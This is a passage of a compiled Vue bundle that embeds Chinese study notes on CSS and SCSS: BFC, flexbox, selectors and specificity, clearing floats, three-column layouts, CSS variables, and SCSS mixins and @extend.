粘性定位是相对定位和固定定位的混合。元素在跨越特定阈值前为相对定位，之后为固定定位。\r\n\t\t\t- 实例\r\n\t\t\t\t- 在 viewport 视口滚动到元素 top 距离小于 10px 之前，元素为相对定位。之后，元素将固定在与顶部距离 10px 的位置，直到 viewport 视口回滚到阈值以下。\r\n\t\t\t- 实现条件\r\n\t\t\t\t- 须指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同。\r\n- display的值为 table-cell, table-caption, inline-block, flex, 或者 inline-flex中的其中一个\r\n- overflow的值不为visible\r\n### BFC的约束规则\r\n- 1，BFC内元素垂直方向的边距会发生重叠（当兄弟元素的外边距不一样时，将以最大的那个外边距为准。）\r\n- 2，BFC的区域不会与浮动元素的BOX重叠（清除浮动）\r\n- 3，BFC在页面上是一个容器，外面的元素不会影响到里面的元素\r\n- 4，计算BFC元素高度时，即使是浮动元素也会参与计算\r\n- 5，每个元素的左外边距与包含块的左边界相接触（从左向右），即使浮动元素也是如此。（这说明BFC中子元素不会超出他的包含块，而position为absolute的元素可以超出他的包含块边界）\r\n### BFC应用\r\n- 使用BFC来防止外边距折叠\r\n\t- 毗邻块盒子的垂直外边距折叠只有他们是在同一BFC时才会发生。如果他们属于不同的BFC，他们之间的外边距将不会折叠。所以通过创建一个新的BFC我们可以防止外边距折叠。\r\n- 使用BFC来包含浮动\r\n\t- 很多时候我们会碰到这种情况，一个容器里有浮动元素。由于这个原因，容器元素没有高度，它的浮动孩子将会脱离页面的常规流。我们通常使用清除浮动来解决这个问题，最受欢迎的方法是使用一个clearfix的伪类元素。但我们同样可以通过定义一个BFC来达到这个目的。\r\n- 使用BFC来防止文字环绕\r\n\t- 给p标签创建BFC即可\r\n- 在多列布局中使用BFC\r\n\t- 如果我们正在创建的一个多列布局占满了整个容器的宽度，在某些浏览器中最后一列有时候将会被挤到下一行。会发生这样可能是因为浏览器舍入（取整）了列的宽度使得总和的宽度超过了容器的宽度。然而，如果我们在一个列的布局中建立了一个新的BFC，它将会在前一列填充完之后的后面占据所剩余的空间。\r\n## CSS3新特性\r\n### 文字阴影（text-shadow）\r\n### 边框\r\n- 圆角（border-radius）\r\n\t- 是一个简写属性，用于设置四个 border-*-radius 属性。\r\n- 边框阴影： box-shadow\r\n\t- box-shadow: 水平阴影的位置 垂直阴影的位置 模糊距离 阴影的尺寸 阴影的颜色 内嵌;\r\n### 盒子模型（box-sizing）\r\n### 渐变：linear-gradient、radial-gradient\r\n### 过渡：transition，可实现动画\r\n### 自定义动画\r\n### 在CSS3中唯一引入的伪元素是 ：selection.\r\n- ::selection 选择器匹配被用户选取的选取是部分。\r\n- 只能向 ::selection 选择器应用少量 CSS 属性：color、background、cursor 以及 outline。\r\n### 媒体查询\r\n### 2D转换：transform：translate(x，y) rotate(x，y) skew(x，y) scale(x，y)\r\n### 3D转换\r\n### 新增的伪类\r\n- p:first-of-type 选择属于其父元素的首个 <p> 元素的每个 <p> 元素。\r\n- p:last-of-type 选择属于其父元素的最后 <p> 元素的每个 <p> 元素。\r\n- p:only-of-type 选择属于其父元素唯一的 <p> 元素的每个 <p> 元素。\r\n- p:only-child 选择属于其父元素的唯一子元素的每个 <p> 元素。 p:nth-child(2) 选择属于其父元素的第二个子元素的每个 <p> 元素。 :enabled、:disabled 控制表单控件的禁用状态。\r\n- :checked，单选框或复选框被选中。html5有哪些新特性、移除了那些元素？如何处理HTML5新标签的浏览器兼容问题？\r\n## 【CSS】内联块元素与<IMG>标签\r\n### display：inline\r\n- 特点\r\n\t- (1)、和其他元素都在一行上；\r\n\t- (2)、元素的高度、宽度、行高及顶部和底部边距不可设置；（仅可设置左右边距）\r\n\t- (3)、元素的宽度就是它包含的文字或图片的宽度，不可改变。\r\n- 示例\r\n### display：block\r\n- 特点\r\n\t- (1)、每个块级元素都从新的一行开始，并且其后的元素也另起一行。（一个块级元素独占一行）;\r\n\t- (2)、元素的高度、宽度、行高以及顶和底边距都可设置;\r\n\t- (3)、元素宽度在不设置的情况下，是它本身父容器的100%（和父元素的宽度一致），除非设定一个宽度。\r\n- 示例\r\n### display：inline-block\r\n- 特点\r\n\t- (1)、和其他元素都在一行上；\r\n\t- (2)、元素的高度、宽度、行高以及顶和底边距都可设置\r\n- 示例\r\n### 额外\r\n- （1）<img>元素是内联还是块级元素？\r\n\t- img属于行内替换元素。height/width/padding/margin均可用。效果等于块元素。（等同于inline-block）\r\n\t- 行内非替换元素，例如, height/width/padding top、bottom/margin top、bottom均无效果。只能用padding left、right和padding left、right改变宽度。\r\n- （2）插入img下面会有空白\r\n\t- 现象\r\n\t- 解决\r\n\t\t- 1、给图片img标签display:block\r\n\t\t- 2、定义图片img标签vertical-align:bottom，vertical-align:middle，vertical-align:top。\r\n\t\t- 3、定义容器里的字体大小font-size为0。\r\n\t- 原理：img元素底部为何有空白？\r\n\t\t- 要理解CSS对于 display: inline 元素的 vertical-align 各个值的含义。vertical-align 的默认值是 baseline，这是一个西文排版才有的概念\r\n\t\t- 对比一下 vertical-align 的另外两个常见值，top 和 bottom\r\n\t\t\t- 可以看到，baseline 和 bottom 之间有一定的距离。实际上，inline 的图片下面那一道空白正是 baseline 和 bottom 之间的这段距离。即使只有图片没有文字，只要是 inline 的图片这段空白都会存在。\r\n\t\t- 到这里就比较明显了，要去掉这段空白，最直接的办法是将图片的 vertical-align 设置为其他值。如果在同一行里有文字混排的话，那应该是用 bottom 或是 middle 比较好。\r\n\t\t- 另外，top 和 bottom 之间的值即为 line-height。假如把 line-height 设置为0，那么 baseline 与 bottom 之间的距离也变为0，那道空白也就不见了。如果没有设置 line-height，line-height 的默认值是基于 font-size 的，视渲染引擎有所不同，但一般是乘以一个系数（比如1.2）。因此，在没有设置 line-height 的情况下把 font-size 设为0也可以达到同样的效果。当然，这样做的后果就是不能图文混排了。\r\n## Flex布局总结\r\n### Flex之前\r\n### 一种新的布局方式\r\n- 1.块级布局侧重垂直方向、行内布局侧重水平方向，flex布局是与方向无关的\r\n- 2.flex布局可以实现空间自动分配、自动对齐\r\n- 3.flex适用于简单的线性布局，更复杂的布局要交给grid布局\r\n### 基本概念\r\n- flex container 的属性(父元素)\r\n\t- flex-direction\t方向\r\n\t\t- row\t按行排列\r\n\t\t- row-revervse\t  按行反向排列\r\n\t\t- column\t按列排列\r\n\t\t- column-revervse 按列反向排列\r\n\t- flex-wrap\t换行\r\n\t\t- wrap\t折行\r\n\t\t- nowrap\t不折行\r\n\t- flex-flow\t上面两个的简写\r\n\t- justify-content\t主轴方向对齐方式\r\n\t\t- space-between 多余空间放置中间\r\n\t\t- space-around  空间放置周围\r\n\t\t- flex-start  全部向起点靠拢\r\n\t\t- flex-end  全部向终点靠拢\r\n\t\t- center  全部往中间靠拢\r\n\t- align-items\t侧轴对齐方式\r\n\t\t- stretch  在子元素高度不写死的情况下，按最高元素高度对齐\r\n\t\t- flex-start  所有元素按照顶部水平线对齐\r\n\t\t- flex-end  所有元素按照其底部水平线对齐\r\n\t\t- center  所有元素按照中间水平线对齐\r\n\t\t- baseline  项目的第一行文字的基线对齐。（较少使用）\r\n\t- align-content\t多行/列内容对齐方式（用的较少）\r\n\t\t- space-between  行与行之间的空隙平均分配\r\n\t\t- space-around  空间放置两边\r\n\t\t- flex-start  全部向侧轴起点靠拢\r\n\t\t- flex-end  全部向侧轴终点靠拢\r\n\t\t- stretch（默认值）  轴线占满整个侧轴\r\n- flex item的属性（子元素）\r\n\t- flex-grow  增长比例（空间过多时）\r\n\t- flex-shrink  收缩比例（空间不够时）\r\n\t- flex-basis  默认大小时（一般不用）\r\n\t- flex  以上三个的缩写\r\n\t- order  顺序（代替双飞翼）\r\n\t- align-self  自身的对齐方式\r\n### 使用Flex布局\r\n- 1.手机页面布局（tapbar+main+tabs）\r\n- 2.产品列表（ul>li*9）\r\n- 3.PC页面居中\r\n- 4.完美居中\r\n## CSS中的百分数都是相对于谁\r\n### （1）第一类——定位类\r\n- absolute\r\n\t- left、right是相对于参照物的width，top和bottom是相对于参照物的height\r\n- relative\r\n\t- left、right是相对于父元素的width，top和bottom是相对于参照物的height\r\n- fixed\r\n\t- 它是相对于视窗定位的，那么自然%的参照物便是视窗了。\r\n### （2）第二类——盒子模型\r\n- margin&padding\r\n\t- 如果设置了%值，那么他们参照的是父元素的宽度\r\n- border-radius\r\n\t- 盒子自身的宽高\r\n### （3）第三类——背景值\r\n- background-size\r\n\t- 盒子自身的宽高：background-size:100% 100%;\r\n- background-position\r\n\t- 这个属性比较特殊，他不是参照原盒子的宽高值，而是原盒子的宽高值减去背景图片的宽高值所得到的剩余值，更为形象的说，下面这两个属性值是等价的："center center"和"50% 50%"，如果你设置了后者，背景图片会自动居中，不用像定位那样还需要transform偏移了。\r\n### （4）第四类——transform\r\n- translate3d()\r\n\t- 这个属性的含义就是在指定方向上进行2d偏移，它的参照物是自身的宽高。而transform3d()的第三个属性，指的是在z轴上的偏移，因为z-index的默认值是auto，所以%值并不能起作用，也就是说对translateZ()赋予百分比的值是无意义的。\r\n### （5）第五类——字体\r\n- font-size\r\n\t- 和height一样，是参照父盒子的字体大小的\r\n- line-height\r\n\t- 是给定的百分比值乘以元素最后计算出的字体大小\r\n- text-indent\r\n\t- 参照的是父元素的width\r\n### 总结\r\n- 相对于父盒子：\r\n\t- 参照父元素对应属性的有：width、height、font-size\r\n\t- 参照父元素的width的有：padding、margin、text-indent\r\n\t- 【特殊】position：relativeleft、right是相对于父元素的width，top和bottom是相对于参照物的height\r\n- 相对于盒子自身：\r\n\t- 盒子模型中的border-radius；\r\n\t- 背景中的background-size；\r\n\t- 在transform变换中，translate()、transform-origin、scale()还有我们拓展的与transform相似的zoom属性，他们都是参照自身的；\r\n\t- line-height行高与它的字体大小有关，所以参照的就是自身的font-size。\r\n- 相对于定位元素：\r\n\t- position：absolute、position：fixed;\r\n## 【css选择器】css选择器与优先级\r\n### 选择器\r\n- 基本选择器\r\n\t- *\t 通配选择器 \t选择文档中所以HTML元素\r\n\t- E\t 元素选择器\t选择指定类型的HTML元素\r\n\t- #id\t ID选择器\t选择指定ID属性值为“id”的任意类型元素\r\n\t- .class\t 类选择器\t选择指定class属性值为“class”的任意类型的任意多个元素\r\n\t-  div,span,img {color:Red}      群组选择器     即具有相同样式的标签分组显示\r\n- 层次选择器\r\n\t- E  F\t后代选择器\t选择匹配的F元素，且匹配的F元素被包含在匹配的E元素内\r\n\t- E>F\t子选择器\t选择匹配的F元素，且匹配的F元素所匹配的E元素的子元素\r\n\t- E+F\t相邻兄弟选择器\t选择匹配的F元素，且匹配的F元素紧位于匹配的E元素的后面\r\n\t- E~F\t通用选择器\t选择匹配的F元素，且位于匹配的E元素后的所有匹配的F元素\r\n- 动态伪类选择器\r\n\t- E:link\t    链接伪类选择器  选择匹配的E元素，而且匹配元素被定义了超链接并未被访问过。常用于链接描点上\r\n\t- E:visited   链接伪类选择器  选择匹配的E元素，而且匹配元素被定义了超链接并已被访问过。常用于链接描点上\r\n\t- E:active   选择匹配的E元素，且匹配元素被激活。常用于链接描点和按钮上\r\n\t- E:hover\t  选择匹配的E元素，且用户鼠标停留在元素E上。IE6及以下浏览器仅支持a:hover\r\n\t- E:focus    选择匹配的E元素，而且匹配元素获取焦点\r\n- 目标伪类选择器\r\n\t- E:target\t选择匹配E的所有元素，且匹配元素被相关URL指向\r\n- 元素状态伪类选择器\r\n\t- E:checked\t选中状态伪类选择器\t匹配选中的复选按钮或者单选按钮表单元素\r\n\t- E:enabled\t启用状态伪类选择器\t匹配所有启用的表单元素\r\n\t- E:disabled\t不可用状态伪类选择器\t匹配所有禁用的表单元素\r\n- 结构伪类选择器\r\n\t- E:fisrt-child\t作为父元素的第一个子元素的元素E。与E:nth-child(1)等同\r\n\t- E:last-child\t作为父元素的最后一个子元素的元素E。与E:nth-last-child(1)等同\r\n\t- E:root\t选择匹配元素E所在文档的根元素。在HTML文档中，根元素始终是html，此时该选择器与html类型选择器匹配的内容相同\r\n\t- E F:nth-child(n)\t选择父元素E的第n个子元素F。其中n可以是整数（1，2，3）、关键字（even，odd）、可以是公式（2n+1）,而且n值起始值为1，而不是0.\r\n\t- E F:nth-last-child(n)\t选择父元素E的倒数第n个子元素F。此选择器与E:nth-child(n)选择器计算顺序刚好相反，但使用方法都是一样的，其中：nth-last-child(1)始终匹配最后一个元素，与last-child等同\r\n\t- E:nth-of-type(n)\t选择父元素内具有指定类型的第n个E元素\r\n\t- E:nth-last-of-type(n)\t选择父元素内具有指定类型的倒数第n个E元素\r\n\t- E:first-of-type\t选择父元素内具有指定类型的第一个E元素，与E:nth-of-type(1)等同\r\n\t- E:last-of-tye\t选择父元素内具有指定类型的最后一个E元素，与E:nth-last-of-type(1)等同\r\n\t- E:only-child\t选择父元素只包含一个子元素，且该子元素匹配E元素\r\n\t- E:only-of-type\t选择父元素只包含一个同类型子元素，且该子元素匹配E元素\r\n\t- E:empty\t选择没有子元素的元素，而且该元素也不包含任何文本节点\r\n\t- 注意\r\n\t\t- （1），“ul>li:nth-child(3)”表达的并不是一定选择列表ul元素中的第3个子元素li，仅有列表ul中第3个li元素前不存在其他的元素，命题才有意义，否则不会改变列表第3个li元素的样式。\r\n\t\t- （2），:nth-child(n)  中参数只能是n，不可以用其他字母代替。\r\n\t\t- （3），:nth-child(odd) 选择的是奇数项，而使用:nth-last-child(odd) 选择的却是偶数项\r\n- 否定伪类选择器\r\n\t- E:not(F)\t匹配所有除元素F外的E元素\r\n- 属性选择器语法\r\n\t- [attribute]\t用于选取带有指定属性的元素。\r\n\t- [attribute=value]\t用于选取带有指定属性和值的元素。\r\n\t- [attribute~=value]\t用于选取属性值中包含指定词汇的元素。\r\n\t- [attribute|=value]\t用于选取带有以指定值开头的属性值的元素，该值必须是整个单词。\r\n\t- [attribute^=value]\t匹配属性值以指定值开头的每个元素。\r\n\t- [attribute$=value]\t匹配属性值以指定值结尾的每个元素。\r\n\t- [attribute*=value]\t匹配属性值中包含指定值的每个元素。\r\n### 选择器优先级\r\n- 第一优先级：无条件优先的属性只需要在属性后面使用！important。它会覆盖页面内任何位置定义的元素样式。ie6不支持该属性。\r\n- 第二优先级：在html中给元素标签加style，即内联样式。该方法会造成css难以管理，所以不推荐使用。\r\n- 第三优先级：由一个或多个id选择器来定义。例如，#id{margin:0;}会覆盖.classname{margin:3pxl}\r\n- 第四优先级：由一个或多个类选择器、属性选择器、伪类选择器定义。如.classname{margin:3px}会覆盖div{margin:6px;}（伪类选择器 = 属性选择器 > 类选择器）\r\n- 第五优先级：由一个或多个标签选择器定义。如div{marigin:6px;}覆盖*{margin:10px；}\r\n- 第六优先级：通配选择器，如*{marigin:6px;}\r\n### 权重\r\n- 内联样式（1000）\r\n- ID选择符（0100）\r\n- 类、伪类、属性选择符（0010）\r\n- 类型、伪元素选择符（0001）\r\n- 通配符、相邻选择符等（0000）\r\n- 继承（没有权重）\r\n## 【清除浮动】CSS清除浮动的方法\r\n### （1）在浮动元素下添加一个空的div，并且为其设置了样式clear:both;\r\n- 这个规则只能影响使用清除的元素本身，不能影响其他元素,clear了隐藏div的both\r\n- 我们是通过在别的元素上清除浮动来实现撑开高度的， 而不是在浮动元素上\r\n### （2）通过BFC清除浮动引起的高度塌陷，原理是BFC在计算高度的时候会连同浮动元素的高度一起计算\r\n### （3）使用CSS中clearfix的after伪元素\r\n- 关于::after和::before的理解\r\n\t- 概述\r\n\t\t- 这两个伪元素相当于是对当前元素的装潢，他们并不是节点，不会出现在dom树中，但是在显示上具备节点的效果。\r\n\t- 使用\r\n\t\t- （1）::after和::before的使用很简单，可以认为其所在元素上存在一前一后的两个的元素，这两个元素默认是内联元素，但我们可以为其增添样式。\r\n\t\t- （2）必须设置content，否则这两个伪元素是无法显示出来的。而content属性，会作为这两个伪元素的内容嵌入他们中。\r\n\t\t- （3）::after和::before是虚拟元素，不会影响真正元素的所在文档的位置，对:first-child或者:last-child这种伪类选择不会造成影响。\r\n\t- 操作\r\n\t\t- ::after和::before是虚拟节点，而不是正在的节点，不在documont里面找到对应Node对象\r\n\t\t- console.log( document.querySelector("ul").childNodes)；得到的是一个只有3个节点的NodeList对象，而两个伪元素并不在对象中。因为::after和::before不是真正的节点，所以我们取不到他们，也不发设置点击等用户事件。\r\n\t\t- 可以通过css的接口获取其样式属性\r\n\t- ::after和::before使用的经验\r\n\t\t- 1.间隔符用法\r\n\t\t- 2.做border三角图标（常考）\r\n\t\t- 3.字符图标\r\n\t\t- 4.webfont的图标\r\n\t\t- 5.做单位、标签、表单必填标准\r\n\t\t- 7.实现一些标签对placeholder的支持\r\n\t\t- 8.实现文字图片居中对齐\r\n\t\t- 9.清除浮动\r\n\t- 总体可以分为四种用法：\r\n\t\t- 1.用css创建装饰性元素\r\n\t\t- 2.用css创建用于布局的元素，实现特殊布局的特殊需要\r\n\t\t- 3.做显示图标的实现手段\r\n\t\t- 4.配合attr显示属性值\r\n\t- 伪类与伪元素的差异\r\n\t\t- 伪类\r\n\t\t\t- 定义\r\n\t\t\t\t- CSS 伪类用于向某些选择器添加特殊的效果。\r\n\t\t\t- 功能\r\n\t\t\t\t- 获取不存在与DOM树中的信息。比如<a>标签的:link、visited等，这些信息不存在与DOM树结构中，只能通过CSS选择器来获取；\r\n\t\t\t\t- 获取不能被常规CSS选择器获取的信息。比如伪类:target，它的作用是匹配文档(页面)的URI中某个标志符的目标元素，例如我们可以通过如下代码来实现页面内的区域跳转：\r\n\t\t- 伪元素\r\n\t\t\t- 定义\r\n\t\t\t\t- 伪元素在DOM树中创建了一些抽象元素，这些抽象元素是不存在于文档语言里的（可以理解为html源码）\r\n\t\t\t\t- 通俗来说\r\n\t\t\t\t\t- 伪元素创建了一个虚拟容器，这个容器不包含任何DOM元素，但是可以包含内容。\r\n\t\t- 总结一下伪类与伪元素的特性及其区别：\r\n\t\t\t- （1）伪类本质上是为了弥补常规CSS选择器的不足，以便获取到更多信息；\r\n\t\t\t- （2）伪元素本质上是创建了一个有内容的虚拟容器；\r\n\t\t\t- （3）CSS3中伪类和伪元素的语法不同；\r\n\t\t\t- （4）可以同时使用多个伪类，而只能同时使用一个伪元素；\r\n## 【布局】CSS中的左右两栏定宽，中间自适应布局方案\r\n### 浮动布局\r\n  .container .left {         \r\n            float: left;\r\n            width: 200px;\r\n            background-color: orange;        \r\n            }\r\n        .container .main {         \r\n            background-color: rgb(0, 255, 106);           \r\n        }\r\n        .container .right {         \r\n            float: right;\r\n            width: 200px;\r\n            background-color: rgb(76, 0, 255);            \r\n        }\r\n<div class="container">\r\n        <div class=\'left\'>111111</div>\r\n        <div class="right">1111111</div>\r\n        <div class=\'center\'>111111111</div>\r\n    </div>\r\n- 左右浮动，中间不用浮动，DOM上中间要放最后\r\n### 定位布局\r\n        .container>div{\r\n            position: absolute;\r\n        }\r\n        .left{\r\n            left:0;\r\n            width: 300px;\r\n            background: red;\r\n        }\r\n         .center{\r\n            left: 300px;\r\n            right: 300px;\r\n            background: yellow;\r\n        }\r\n        .right{\r\n            right:0;\r\n            width: 300px;\r\n            background: blue;\r\n        }\r\n        <div class="left"></div>\r\n        <div class="center"></div>\r\n        <div class="right"></div>\r\n- 首先三个盒子都得绝对定位，左left：0，右right：0，中left：300px；right：300px，DOM正常\r\n### Flex布局\r\n       .container{\r\n            display: flex;\r\n        }\r\n        .left{\r\n            width: 300px;\r\n            background: red;\r\n        }\r\n        .center{\r\n            flex:1;\r\n            background: yellow;\r\n        }\r\n         .right{\r\n            width: 300px;\r\n            background: blue;\r\n        }\r\n- 父元素display：flex；左右设置宽度，中间flex：1，DOM正常\r\n### Grid布局\r\n.layout.grid .left-center-right{\r\n            width:100%;\r\n            display: grid;\r\n            grid-template-rows: 100px;\r\n            grid-template-columns: 300px auto 300px;\r\n        }\r\n        .layout.grid .left-center-right>div{\r\n        }\r\n        .layout.grid .left{\r\n            background: red;\r\n        }\r\n        .layout.grid .center{\r\n            background: yellow;\r\n        }\r\n        .layout.grid .right{\r\n            background: blue;\r\n        }\r\n### 表格布局\r\n      .container{\r\n            width:100%;\r\n            height: 100px;\r\n            display: table;\r\n        }\r\n        .containter>div{\r\n            display: table-cell;\r\n        }\r\n        .left{\r\n            width: 300px;\r\n            background: red;\r\n        }\r\n       .center{\r\n            background: yellow;\r\n        }\r\n         .right{\r\n            width: 300px;\r\n            background: blue;\r\n        }\r\n- 给父元素设置display：table；三个盒子都设置display：table-cell；左右设置宽度，DOM正常\r\n### 圣杯布局\r\n<template>\r\n<header>header</header>\r\n<section class="wrapper">\r\n    <section class="col main">main</section>\r\n    <aside class="col left">left</aside>\r\n    <aside class="col right">right</aside>\r\n</section>\r\n<footer>footer</footer>\r\n</template>\r\n- 诞生缘由\r\n\t- 希望中部 main 部分优先显示的话，是可以做布局优化的。提前即可优先渲染\r\n- 存在缺陷\r\n\t- 如果将浏览器无限变窄，「圣杯」将会「破碎」掉。当 main 部分的宽小于 left 部分时就会发生布局混乱。\r\n- CSS部分\r\n- 要点\r\n\t- （1）父元素设置左右padding，并创建BFC（设置overflow：hidden或其他）或使用伪元素清除浮动\r\n\t- （2）为三个盒子设置position：relative；float：left\r\n\t- （3）中间盒子宽度100%，左右定宽\r\n\t- （4）为左盒子设置margin-left：-100%，left：-100px；右盒子设置margin-left：-100px，right：-定宽px\r\n### 双飞翼布局\r\n<header>header</header>\r\n<section class="wrapper">\r\n    <section class="col main">\r\n        <section class="main-wrap">main</section>\r\n    </section>\r\n    <aside class="col left">left</aside>\r\n    <aside class="col right">right</aside>\r\n</section>\r\n<footer>footer</footer>\r\n- css部分\r\n- 缺点\r\n\t- 多加一层 dom 树节点，增加了 css 样式规则表和 dom 树合并成布局树的计算量\r\n- 要点\r\n\t- （1）父元素BFC清除浮动\r\n\t- （2）三个盒子全部左浮动\r\n\t- （3）中间main盒子宽度100%，其父盒子左右margin为定宽\r\n\t- （4）左盒子margin-left：-100%，右盒子margin-left：-定宽px\r\n### 选用情况\r\n',Hn={data:function(){return{MainComponent:qn}}},Bn=Hn,Fn=Object(u["a"])(Bn,Pn,Nn,!1,null,"b377bde6",null),Un=Fn.exports,Jn=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div")},zn=[],Wn={},$n=Wn,Gn=Object(u["a"])($n,Jn,zn,!1,null,"76f4e806",null),Vn=(Gn.exports,function(){var n=this,r=n.$createElement;n._self._c;return n._m(0)}),Qn=[function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",[t("h3",[n._v("var() 变量 ")]),t("pre",[n._v("    var()函数可以代替元素中任何属性中的值的任何部分。\n    var()函数不能作为属性名、选择器或者其他除了属性值之外的值。\n    （这样做通常会产生无效的语法或者一个没有关联到变量的值。）\n\n语法\n方法的第一个参数是要替换的自定义属性的名称。函数的可选第二个参数用作回退值。\n如果第一个参数引用的自定义属性无效，则该函数将使用第二个值。\n\nvar( custom-property-name , declaration-value? )\n\n\n:root {\n  --main-bg-color: pink;\n}\n\nbody {\n  background-color: var(--main-bg-color);\n}\n/* 后备值 */\n\n/* 在父元素样式中 */\n.component {\n  --text-color: #080; /* header-color 并没有被设定 */\n}\n\n/* 在 component 的样式中： */\n.component .header {\n  color: var(--header-color, blue); /* 此处 color 被回退到 blue */\n}\n\n.component .text {\n  color: var(--text-color, black);\n}\n")])])}],Kn={},Xn=Kn,Yn=Object(u["a"])(Xn,Vn,Qn,!1,null,"7436dd0f",null),Zn=Yn.exports,nr=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},rr=[],tr="\r\n\r\n## 1、变量 $ 使用\r\n\r\n我们可以通过变量来复用属性值，比如颜色、边框大小、图片路径等，这样可以做到更改一处，从而进行全局更改，从而实现“换肤”的功能。\r\n\r\n**实例1：我们的组件库，利用变量配置，进行统一更改组件的颜色、字体大小等（换肤）：**\r\n\r\n```\r\n$color-primary: #3ecacb;\r\n$color-success: #4fc48d;\r\n$color-warning: #f3d93f;\r\n$color-danger: #f6588e;\r\n$color-info: #27c6fa;\r\n```\r\n\r\n**实例2：图片的配置及全局引入**\r\n\r\n`Scss`中图片的使用，可能存在以下2个问题：\r\n\r\n（1）如果样式文件和使用该样式文件的`vue`文件不在同一目录会出现图片找不到\r\n\r\n（2）如果将图片路径配置变量写在`vue`文件的`style`中，但是该写法导致图片和样式分离\r\n\r\n我们可以采用将图片路径写成配置文件，然后进行全局引入，这样可以统一更改图片路径（并且该方法只会在使用相应图片时进行加载，不会导致额外性能问题）：\r\n\r\n```\r\n$common-path: './primary/assets/img/';\r\n$icon-see: $common-path+'icon-see.png';\r\n$icon-play: $common-path+'icon-play.png';\r\n$icon-comment: $common-path+'icon-comment.png';\r\n$icon-checkbox: $common-path+'icon-checkbox.png';\r\n```\r\n\r\n## 2、[@import]导入Scss文件\r\n\r\n（1）`Css`中的`@import`规则，它允许在一个`css`文件中导入其他`css`文件。然而，后果是只有执行到`@import`时，浏览器才会去下载其他`css`文件，这导致页面加载起来特别慢。\r\n\r\n（2）`Scss`中的`@import`规则，不同的是，`scss`的`@import`规则在生成`css`文件时就把相关文件导入进来。这意味着所有相关的样式被归纳到了同一个`css`文件中，而无需发起额外的下载请求。\r\n\r\n**实例1：组件库中统一将组件的样式文件`import`进`index.sccs`中**，然后如果项目中有使用组件库的地方只需要在项目的入口处，引入`index.scss`文件，如下所示在`index.scss`文件中引入各组件的样式文件：\r\n\r\n```\r\n@import \"./base.scss\";\r\n@import \"./webupload.scss\";\r\n@import \"./message-hint.scss\";\r\n```\r\n\r\n## 3、局部文件命名的使用\r\n\r\n`scss`局部文件的文件名以下划线开头。这样，`scss`就不会在编译时单独编译这个文件输出`css`，而只把这个文件用作导入。在使用`scss`时，混合器`mixins`是最适合的使用场景，因为混合器不需要单独编译输出`css`文件。\r\n\r\n**实例1：将混合器的名称写成局部文件命名的方式，如下图所示**\r\n\r\n \r\n\r\n## 4、Scss的嵌套功能和父选择器标识符\r\n\r\n我们可以使用嵌套功能和父选择器标识符 & 来缩减重复的代码，特别如果你`CSS`类采用`BEM`命名规范，样式类命名存在冗长的问题。使用此功能，能解决`BEM`命名冗长的问题，且样式可读性更高。\r\n\r\n**实例1：嵌套功能和父选择器标识符 & 解决BEM冗长问题：**\r\n\r\n```\r\n.tea-assignhw { \r\n &__top {  \r\n  margin: 0;  \r\n} \r\n &__content { \r\n   padding-left: 45px; \r\n }  \r\n&__gradeselect { \r\n   width: 158px;  \r\n }\r\n}\r\n```\r\n\r\n**实例2：**嵌套中使用子选择器、兄弟选择器和伪类选择器\r\n\r\n**（1）子选择器**\r\n\r\n```\r\n&__hint {\r\n  margin: 20px;  \r\n  font-size: 14px;  \r\n  > p:first-child { \r\n     font-weight: bold;  \r\n }\r\n}\r\n```\r\n\r\n**（2）兄弟选择器**\r\n\r\n```\r\n&__input { \r\n width: 220px; \r\n & + span {   \r\n   margin-left: 10px;  \r\n }\r\n}\r\n```\r\n\r\n**（3）伪类选择器**\r\n\r\n```\r\n&__browse {\r\n  background: url($btn-search) no-repeat;  \r\n&:hover {   \r\n  background: url($btn-search) -80px 0 no-repeat;  \r\n}  \r\n&:visited {  \r\n  background: url($btn-search) -160px 0 no-repeat; \r\n }\r\n}\r\n```\r\n\r\n## 5、[@mixin]  混合器和 [@extend]  指令的使用\r\n\r\n变量使你能够复用属性值，但如果想要复用一大段规则呢？传统的做法是，如果在样式表\r\n\r\n中发现重复，就会把公共的规则抽离出来放到新的`CSS`类中。\r\n\r\n在`Scss`中可以使用混合器`@mixin`和`@extend`继承指令来解决以上提到的复用一大段规则的场景。但两者的使用场景又有啥区别呢？\r\n\r\n（1）`@mixin`主要的优势就是它能够接受参数。如果想传递参数，你会很自然地选择`@mixin`而不是[@extend] ，因为`@extend`不能够接受参数\r\n\r\n（2）因为混合器规则都混入到其他类中，所以在输出的样式表中不能完全避免重复。选择器继承的意思就是让一个选择器能够复用另一个选择器的所有样式，但又不重复输出这些样式属性；即使用`@extend`产生 [DRY CSS](https://link.juejin.im/?target=http%3A%2F%2Fvanseodesign.com%2Fcss%2Fdry-principles%2F)风格的代码（Don't repeat yourself）\r\n\r\n综上所述，如果你需要传参数，只能使用`@mixin`混合器，否则用`@extend`继承来实现更优。\r\n\r\n**实例1：[@mixin] 混合器的使用**\r\n\r\n```\r\n@mixin paneactive($image, $level, $vertical) { \r\n  background: url($image) no-repeat $level $vertical;  \r\n  height: 100px;  \r\n  width: 30px; \r\n  position: relative;  \r\n  top: 50%;\r\n}\r\n&--left-active {  \r\n  @include paneactive($btn-flip, 0, 0);\r\n}\r\n&--right-active { \r\n  @include paneactive($btn-flip, 0, -105px);\r\n}\r\n```\r\n\r\n**实例2：[@extend] 继承的使用**\r\n\r\n```\r\n.common-mod {  \r\n  height: 250px;  \r\n  width: 50%;  \r\n  background-color: #fff;  \r\n  text-align: center;\r\n}\r\n&-mod { \r\n  @extend .common-mod;  \r\n  float: right;\r\n}\r\n&-mod2 { \r\n  @extend .common-mod;\r\n}\r\n```\r\n\r\n## 6、[@mixin]  混合器默认参数值的使用\r\n\r\n在`@include`混合器时不必传入所有的参数，我们可以给参数指定一个默认值，如果所需要传的参数是 默认值，则`@include`时可以省略该参数；如果所需要传的参数不是默认值，则`@include`时则传入新的参数。\r\n\r\n**实例1：[@mixin] 混合器默认参数值的使用**\r\n\r\n```\r\n@mixin pane($dir: left) {  \r\n  width: 35px; \r\n  display: block;  \r\n  float: $dir;  \r\n  background-color: #f1f1f1;\r\n}\r\n&__paneleft { \r\n  @include pane;\r\n}\r\n&__paneright {\r\n  @include pane(right);\r\n}\r\n```\r\n\r\n## 7、#{} 插值的使用\r\n\r\n通过 #{} 